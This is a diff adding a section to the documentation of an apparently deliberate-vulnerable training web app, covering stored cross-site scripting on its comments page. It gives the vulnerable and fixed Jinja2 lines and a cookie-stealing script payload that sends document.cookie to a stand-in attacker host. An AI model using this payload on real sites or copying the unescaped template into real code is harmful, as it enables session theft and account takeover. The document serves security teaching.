@@ -111,3 +111,53 @@ When using `.contains()`, the search string is bound as a parameter instead of b
 - **Config Flag:** `config.VULN_MODE["sqli"]` (Shares the general SQLi toggle)
 - Set to `True` to enable the vulnerable string-concatenation search query.
 - Set to `False` to enable the patched SQLAlchemy ORM parameterized query.
+
+---
+
+## Page 3: Comments — Stored Cross-Site Scripting (XSS)
+
+### Page Structure
+- **Route Path:** `/comments`
+- **Template File:** `templates/comments.html`
+- **Form Fields:** `name` (text), `comment` (textarea)
+- **Backend File/Function Involved:** `modules/xss.py` -> `comments()` route function
+
+### Vulnerability Type & OWASP Category
+Stored Cross-Site Scripting (XSS) — **A03:2021-Injection**
+
+### Root Cause
+The vulnerability stems from the frontend template rendering user-supplied data without proper output encoding. In vulnerable mode, the Jinja2 template explicitly disables its built-in auto-escaping by using the `| safe` filter. This allows any raw HTML or JavaScript stored in the database to be rendered directly into the DOM as executable code. Note that the backend (`xss.py`) correctly does not sanitize the input upon saving; XSS is primarily an output-encoding problem.
+
+Vulnerable line of code (`templates/comments.html`):
+```html
+{{ c.text | safe }}
+```
+
+### Exploitation Steps
+1. Navigate to the guestbook page at `/comments`.
+2. Ensure the vulnerability mode is active (Footer should read "Mode: VULNERABLE").
+3. In the Name or Comment field, enter the following payload:
+   `<script>fetch('http://ATTACKER_HOST:9001/steal?c='+document.cookie)</script>`
+4. Click **Post Comment**.
+
+**How the payload works:**
+Unlike *Reflected* XSS (where the payload is bounced back immediately via a URL parameter), this payload is saved directly into the `comments` database table. This makes it a **Stored (Persistent) XSS** attack. Every time *any* visitor navigates to the `/comments` page, the backend retrieves this payload from the database and embeds it into the HTML document. When the victim's browser parses the page, it hits the `<script>` tag and executes it in the context of their session. 
+*(Note: This exact payload is reused later in **Page 7: Session Hijacking** to steal the victim's session cookie.)*
+
+### Impact
+- **Severity:** High
+- **Gain:** Client-side code execution. An attacker can force victims' browsers to perform actions on their behalf, rewrite the DOM (defacement), or silently exfiltrate sensitive data like session cookies, which leads directly to complete account takeover.
+
+### Fix Applied
+The patched version removes the `| safe` filter from the Jinja2 template. By default, Jinja2 employs context-aware auto-escaping.
+
+Patched code (`templates/comments.html`):
+```html
+{{ c.text }}
+```
+When auto-escaping is active, Jinja2 translates dangerous characters into their safe HTML-entity equivalents before they reach the browser (e.g., `<` becomes `&lt;` and `>` becomes `&gt;`). As a result, the browser interprets the payload purely as literal text rather than executable markup.
+
+### How to Toggle
+- **Config Flag:** `config.VULN_MODE["xss"]`
+- Set to `True` to use the `| safe` filter (disabling auto-escaping).
+- Set to `False` to rely on Jinja2's default auto-escaping (safely rendering HTML).
